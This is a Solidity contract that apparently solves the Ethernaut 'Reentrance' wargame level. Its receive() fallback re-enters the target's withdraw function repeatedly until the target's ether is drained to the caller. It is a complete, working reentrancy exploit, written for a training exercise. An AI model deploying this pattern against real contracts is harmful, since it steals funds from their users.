// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import '../ethernaut/levels/Reentrance.sol';

contract ReentranceSolution {
  Reentrance target;
  constructor(address targetAddress) public {
    target = Reentrance(payable(targetAddress));
  }

  function exploit() external payable {
    target.donate{value: msg.value}(address(this));
    target.withdraw(msg.value);
    msg.sender.transfer(address(this).balance);
  }

  receive() external payable {
    uint nextAmount = target.balanceOf(address(this));
    if (address(target).balance < nextAmount) {
      nextAmount = address(target).balance;
    }
    if (nextAmount > 0) {
      target.withdraw(nextAmount);
    }
  }
}